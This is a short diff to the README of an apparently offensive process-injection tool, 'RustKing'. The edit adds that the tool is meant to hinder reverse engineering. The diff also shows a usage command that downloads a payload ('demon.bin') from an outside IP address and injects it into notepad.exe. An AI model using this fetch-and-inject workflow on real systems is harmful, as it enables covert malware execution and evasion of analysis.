@@ -307,9 +307,9 @@ Process Injector 4: RatKing (Manual Mapping ntdll.dll)
 ```
 
 ### RustKing
-RustKing is an adapted version of `RatKing` on steroids, written in Rust.
+RustKing is an adapted version of `RatKing` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder only.
 
-**NOTE:** RustKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RustKing.
+**NOTE:** RustKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RustKing. `--target` must be exact match.
 ```
 C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe
 
